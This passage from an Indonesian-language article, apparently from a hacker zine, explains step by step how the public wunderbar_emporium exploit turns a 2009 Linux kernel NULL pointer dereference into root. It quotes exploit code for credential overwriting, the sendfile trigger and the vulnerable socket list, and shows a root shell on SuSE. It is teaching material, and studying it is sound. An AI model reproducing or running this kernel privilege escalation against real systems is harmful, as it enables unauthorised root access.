+linux, sehingga kita dapat menggunakan pemanggilan langsung (fastcall) dari
+suatu program dengan bantuan gcc. Dalam exploit.c terdapat bagian berikut ini:
+
+...
+typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) \
+                                 (* _prepare_kernel_cred)(unsigned long cred);
+
+_commit_creds commit_creds;
+_prepare_kernel_cred prepare_kernel_cred;
+...
+
+dengan fungsi diatas commit_creds dan prepare_kernel_cred merupakan variable
+yang memegang lokasi symbol fungsi commit_creds serta prepare_kernel_cred dalam
+memory (export dari kernel). Dengan cara inilah maka fungsi commit_creds dapat
+dipanggil dari dalam exploit.c, namun tentu saja tidak semua kernel memiliki
+symbol ini, itu sebabnya pada bagian awal fungsi get_kernel_sym() termasuk
+mencari apakah pada kernel terdapat symbol "commit_creds" dan
+"prepare_kernel_cred".
+
+Tujuan dari fungsi commit_creds sudah jelas, fungsi tersebut akan memberikan
+credential yang baru pada suatu proses. Dan credential yang baru tersebut
+diminta melalui fungsi prepare_kernel_cred(0) dimana credential baru untuk uid=0
+(root) akan disiapkan. Jika berhasil, maka variable "got_root= 1" akan di-set.
+
+Jika kernel yang digunakan target adalah kernel jenis lama ataupun tidak
+memiliki fungsi commit_creds(), maka tehnik untuk mendapatkan root model lama
+akan dijalankan. 
+
+...
+else {
+		unsigned int *current;
+		unsigned long orig_current;
+		unsigned long orig_current_4k = 0;
+
+		if (sizeof(unsigned long) != sizeof(unsigned int))
+			orig_current = get_current_x64();
+		else {
+			orig_current = orig_current_4k = get_current_4k();
+			if (orig_current == 0)
+				orig_current = get_current_8k();
+		}
+...
+
+Linux memiliki support untuk dua macam kernel stack, 4K dan 8K kernel page dalam
+single-page untuk arsitektur x86. Secara default, x86 men-support 8K kernel
+stacks, dan ini digunakan juga oleh sistem operasi lain seperti Microsoft
+Windows. Namun sejak kernel 2.6.6 (saya sendiri tidak yakin kapan patch untuk 4K
+stack dimasukan dalam kernel Linux) linux memasukan feature ini kedalam kernel
+versi stabil. Pengurangan besar kernel stack sebesar 50% ini dipercaya dapat
+meningkatkan performa linux, dan telah di-implementasikan oleh distro seperti
+Fedora atau RedHat.
+
+Mungkin kita akan bertanya-tanya mengapa untuk 4K/8K stack dibuat fungsi yang
+berbeda?atau mengapa antara x86 (32-bit) dan x64 (64-bit) dibuat juga fungsi
+yang berbeda?Jawabannya adalah alokasi memory. Alokasi sistem memory yang
+dilakukan oleh kernel berbeda-beda, antara 2.4 dengan 2.6 saja terdapat
+perbedaan style alokasi memory.
+
+Wunderbar emporium merupakan contoh eksploit yang sudah dipoles untuk sebisa
+mungkin stabil dijalankan pada arsitektur 32/64 bit ataupun penggunaan kernel
+2.4/2.6, sehingga eksploit ini melakukan beragam pengecekan diatas. 
+
+Jika pada metode pertama (commit_cred) kita menggunakan built-in fungsi kernel
+untuk mendapatkan credential root (uid=0), maka pada metode kedua yang disebut
+old-style ini kita akan melakukan 'patching' secara manual dengan mencari suatu
+lokasi memory dan kemudian mengganti isinya sehingga proses yang kita jalankan
+(eksploit) mendapatkan credential root.
+
+Pertanyaan selanjutnya adalah "apa yang kita cari?!". Jawaban singkat,
+"task_struct". Dalam Linux, setiap proses memiliki struktur yang disebut sebagai
+"task_struct". Ketika suatu aplikasi/program dijalankan, dan proses/thread
+dibuat oleh kernel maka proses tersebut akan memiliki beberapa identitas seperti
+informasi stacks, register, parent process, dll. Termasuk diantaranya adalah uid
+dari proses tersebut. Informasi ini disimpan dalam memory secara dinamis ketika
+proses dibuat. 
+
+Proses dari eksploit yang kita jalankan tentu saja akan memiliki uid yang
+menjalankan proses tersebut (mis: apache, nobody, local user, dll), dan tugas
+dari "gimme r00t" adalah mencari lokasi task_struct yang berisi uid untuk
+kemudian diganti dengan uid milik root. Mudah bukan?!
+
+Kok bisa semudah itu?! Jangan lupa, bug yang kita eksploitasi ini merupakan
+"ring0", apapun perintahnya akan dijalankan :).
+
+Langkah pertama tentu saja mencari lokasi dari proses saat ini, berikut ini
+fungsi untuk x86 (4K/8K) dan x64 (8K),
+
+...
+static inline unsigned long get_current_4k(void)
+{
+	unsigned long current = 0;
+#ifndef __x86_64__
+	asm volatile (
+	" movl %%esp, %0;"
+	: "=r" (current)
+	);
+#endif
+	current = *(unsigned long *)(current & 0xfffff000);
+	if (current < 0xc0000000 || current > 0xfffff000)
+		return 0;
+
+	return current;
+}
+
+static inline unsigned long get_current_8k(void)
+{
+	unsigned long current = 0;
+
+#ifndef __x86_64__
+	asm volatile (
+	" movl %%esp, %0;"
+	: "=r" (current)
+	);
+#endif
+	current &= 0xffffe000;
+	eightk_stack = 1;
+	if ((*(unsigned long *)current < 0xc0000000) || \
+           (*(unsigned long *)current > 0xfffff000)) {
+		twofourstyle = 1;
+		return current;
+	}
+	return *(unsigned long *)current;
+}
+
+static inline unsigned long get_current_x64(void)
+{
+	unsigned long current = 0;
+#ifdef __x86_64__
+	asm volatile (
+	"movq %%gs:(0), %0"
+	: "=r" (current)
+	);
+#endif
+	return current;
+}	
+...
+
+Ambil contoh diatas untuk x86/4K, kode awal merupakan kode inline assembly yang
+digunakan untuk mendapatkan isi register [ESP]. Ketika suatu proses dibuat, maka
+ESP (Extended Stack Pointer) akan menyimpan lokasi memory awal dari stack.
+Setiap proses akan memiliki stack tersendiri untuk menyimpan nilai yang sifatnya
+dinamis, dalam hal ini kita fokuskan pada nilai uid dari proses tersebut yang
+diberikan oleh kernel. Nilai ESP tersebut akan dimasukan pada variable current.
+Variable tersebut kemudian akan dikenai proses logika "and" dengan lokasi memory
+0xfffff000. Akan dilakukan pengecekan apakah nilai current lebih besar dari
+0xc0000000 dan lebih kecil dari 0xfffff000 karena lokasi tersebut merupakan
+standar untuk x86/4K. Cukup jelas bukan?!
+
+Setelah lokasi awal dari stack didapatkan, maka selanjutnya adalah mencari
+posisi informasi uid disimpan, 
+
+...
+repeat:
+	current = (unsigned int *)orig_current;
+	while (((unsigned long)current < (orig_current + 0x1000 - 17 )) &&
+		(current[0] != our_uid || current[1] != our_uid ||
+		 current[2] != our_uid || current[3] != our_uid))
+		 	current++;
+
+	if ((unsigned long)current >= (orig_current + 0x1000 - 17 )) {
+		if (orig_current == orig_current_4k) {
+			orig_current = get_current_8k();
+			goto repeat;
+		}
+		return;
+	}
+	
+	got_root = 1;
+	memset(current, 0, sizeof(unsigned int) * 8);
+	}
+
+	return;	
+}
+...
+
+Proses pencarian dilakukan dari posisi "current" hingga "(current + 0x1000 -
+17)", apabila telah didapatkan posisi dalam memory yang berisi informasi uid
+maka selanjutnya adalah mengganti nilainya dengan "0". Untuk itu digunakan
+fungsi memset().
+
+Inilah salah satu metode lama untuk mendapatkan uid root dalam Linux. Jika
+exploit.c berhasil mencapai titik ini berarti tahap persiapan telah dilakukan
+dengan baik.
+
+Semua langkah diatas merupakan umpan yang akan dijalankan oleh kernel target
+sesaat setelah mengalami bug NULL pointer dereference. Sehingga langkah
+selanjutnya sangat sederhana, trigger bug pada kernel.
+
+...
+	/* trigger it */
+	{
+		char template[] = "/tmp/sendfile.XXXXXX";
+		int in, out;
+
+		// Setup source descriptor
+		if ((in = mkstemp(template)) < 0) {
+			fprintf(stdout, "failed to open input descriptor,
+                                         %m\n");
+			return 1;
+		}
+
+		unlink(template);
+
+		// Find a vulnerable domain
+		d = 0;
+repeat_it:
+		for (; domains[d][0] != DOMAINS_STOP; d++) {
+			if ((out = socket(domains[d][0], domains[d][1], 
+                                          domains[d][2])) >= 0)
+				break;
+		}
+    
+		if (out < 0) {
+			fprintf(stdout, "unable to find a vulnerable domain, \
+                                         sorry\n");
+			return 1;
+		}
+
+		// Truncate input file to some large value
+		ftruncate(in, getpagesize());
+
+		// sendfile() to trigger the bug.
+		sendfile(out, in, NULL, getpagesize());
+	}
+...
+
+Ada pendapat yang mengatakan bahwa "menemukan bug lebih sulit dibandingkan
+sekedar menulis eksploit", namun ada juga yang mengatakan bahwa "menulis
+eksploit (yang reliable) lebih rumit karena harus melewati beragam proteksi dari
+sistem dibandingkan menemukan bug yang hanya bermodalkan fuzzer". Well, saya
+tidak tahu mana yang benar namun tentu saja masing-masing ada tantangan
+tersendiri. Namun untuk bug kali ini para penulis eksploit tidak perlu bersusah
+payah karena dalam advisories-nya julien dan taviso sudah memberikan metode
+untuk men-trigger bug tersebut. Trigger diatas adalah implementasi dari
+advisories mereka. Dan domain yang akan diserang telah didefinisikan sebelumnya
+(bisa ditambahkan sendiri),
+
+/* Vulnerable Domain untuk kernel < 2.6.30-r5*/
+const int domains[][3] = { 
+	{PF_APPLETALK, SOCK_DGRAM, 0 },
+	{PF_IPX, SOCK_DGRAM, 0 }, 
+	{PF_IRDA, SOCK_DGRAM, 0 },
+	{PF_X25, SOCK_DGRAM, 0 }, 
+	{PF_AX25, SOCK_DGRAM, 0 },
+	{PF_BLUETOOTH, SOCK_DGRAM, 0 },
+	{PF_PPPOX, SOCK_DGRAM, 0 }, 
+	{PF_IUCV, SOCK_STREAM, PF_IUCV },
+	{PF_INET6, SOCK_SEQPACKET, IPPROTO_SCTP },
+	{PF_PPPOX, SOCK_DGRAM, PX_PROTO_OL2TP },
+	{DOMAINS_STOP, 0, 0 }
+};
+
+
+Tidak ada yang perlu dijelaskan lebih jauh disini.
+
+Sisa dari proses eksploit adalah membiarkan kernel masuk dalam perangkap NULL
+ptr dereference dan menjalankan beragam hal yang telah dipersiapkan diatas.
+Hasilnya:
+
+1. Beragam modul LSM akan di-disable (diset 0).
+2. Proses dari eksploit akan memiliki uid = 0 (root).
+
+Bagian akhir adalah tujuan dari semua ini,
+
+...
+	execl("/bin/sh", "/bin/sh", "-i", NULL);
+...
+
+Dengan uid=0 kita akan membangkitkan program shell yang kemudian memberikan kita
+si cantik "r00tsh3ll". Berikut contohnya pada target SuSe Linux Enterprise 9
+(default installation without hardening):
+
+cyberheb@SuSe:~/public_exploit/wunderbar_emporium> id
+uid=1001(cyberheb) gid=100(users) groups=10(wheel),100(users)
+cyberheb@SuSe:~/public_exploit/wunderbar_emporium> ./wunderbar_emporium.sh
+ [+] MAPPED ZERO PAGE!
+ [+] Resolved security_ops to 0xc03eb7a0
+ [+] Resolved sel_read_enforce to 0xc01c9a50
+ [+] got ring0!
+ [+] detected 2.6 style 8k stacks
+ [+] Disabled security of : nothing, what an insecure machine!
+ [+] Got root!
+sh-2.05b# id
+uid=0(root) gid=0(root) groups=10(wheel),100(users)
+
+
+Inilah akhir dari proses local kernel eksploitation yang memanfaatkan NULL
+pointer deference.
+
+
+===// Final Words \\===
+
+Thanks untuk seorang rekan yang sering mengajak diskusi mengenai bagaimana
+'internal eksploit' bekerja ketika suatu public eksploit dirilis sehingga
+menjadi bahan dasar ide pembuatan artikel ini (I know, won't say ur name ;) ).
+
+Artikel ini dibuat dengan harapan setelah membaca artikel ini maka para pembaca
+bisa memahami dengan jelas konsep dari bug NULL pointer dereference, mulai dari
+teori dasar hingga bagaimana proses eksploitasi bisa terjadi.
+
+So, as always, semoga bermanfaat!
+
+
+===// Reference \\===
+
+[1].  http://lwn.net/Articles/342330/
+[2].  http://lwn.net/Articles/342420/
+[3].  http://kernelbof.blogspot.com/
+[4].  http://www.tldp.org/LDP/tlk/tlk.html
+[5].  http://www.google.com/search?hl=en&q=linux+null+pointer+dereference
+[6].  http://cansecwest.com/core05/memory_vulns_delalleau.pdf
+[7].  http://blog.cr0.org/2009/06/bypassing-linux-null-pointer.html
+[8].  http://en.wikipedia.org/wiki/Linux_Security_Modules
+[9].  http://lists.grok.org.uk/pipermail/full-disclosure/2009-July/069714.html
+[10]. http://mirror.celinuxforum.org/gitstat/commit-detail.php?commit=33dccbb050bbe35b88ca8cf1228dcf3e4d4b3554
+[11]. http://article.gmane.org/gmane.linux.network/124939
+[12]. http://archives.neohapsis.com/archives/fulldisclosure/2009-08/0174.html
+[13]. http://xorl.wordpress.com/2009/08/18/cve-2009-2692-linux-kernel-proto_ops-null-pointer-dereference/
+[14]. http://www.grsecurity.net/~spender/wunderbar_emporium2.tgz
+
+
+===// Greetz \\===
+
+~ un-d34d: Kecoak Elektr0nik staff
+~ alM0st dead: ind0nesian Undergr0und Community
+~ and of c0urse...ECH0 staff for their contribution to community :)
+
